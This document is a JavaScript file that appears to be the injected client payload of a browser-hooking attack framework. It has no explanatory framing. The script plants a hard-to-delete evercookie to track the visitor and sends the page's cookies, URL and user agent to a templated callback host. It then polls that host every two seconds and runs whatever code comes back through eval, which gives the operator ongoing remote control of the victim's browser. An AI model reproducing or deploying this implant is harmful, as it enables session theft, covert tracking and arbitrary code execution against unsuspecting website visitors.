this.jscallback="<steak>callbackpath</steak>";
this.jsurl="<steak>jsurl</steak>";

function makeclientid(length) {
    var result           = '';
    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for ( var i = 0; i < length; i++ ) {
       result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
 }
function sendDataBack(data,taskid)
{
    url=this.jscallback
    data={'dataupload':data}
    data['clientbasicinfo']={}
    data['clientbasicinfo']['jsurl']=this.jsurl
    data['clientbasicinfo']['clientid']=this.clientid
    data['clientbasicinfo']['taskid']=taskid

    data=Base64.encode(JSON.stringify(data))
    var retval='shit'
    $.ajax({
        type: "post",
        url: url,
        async: false, 
        data: {'content':data},
        contentType: "application/x-www-form-urlencoded; charset=utf-8",
        success: function(data) {
            retval=data
        } 
    });
    return retval
}
function setevercookie(name,value)
{
    this.ec.evercookie_cookie(name, value)
    this.ec.evercookie_userdata(name, value)
    this.ec.evercookie_window(name, value)
}
function getevercookie(name)
{
    value=undefined
    return this.ec.evercookie_cookie(name, value) || this.ec.evercookie_userdata(name, value) || this.ec.evercookie_window(name, value)
}
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}
function evalcode(code){
    eval(code)
}
function newuser(clientid){
    setevercookie('steakcookie',clientid)
    curdomaincookies=document.cookie
    cururl=location.href
    useragent=navigator.userAgent
    data={'curdomaincookies':document.cookie,'cururl':cururl,'useragent':useragent}
    sendDataBack(data,"")
}

this.ec = new evercookie();
async function main()
{
    cookie=getevercookie('steakcookie')
    
    if(cookie==undefined)
    {
        // New User
        this.clientid=makeclientid(15)
        newuser(this.clientid)
    }else{
        this.clientid=cookie
    }
    
    while(1)
    {
        await sleep(2000)
        result=sendDataBack("Rollback","")
        console.log(result)
        if(result=="Restart"){
            newuser(this.clientid)
        }else if(result!=""){
            //New Task
            setTimeout(evalcode,500,result);
        }
    }
}

main()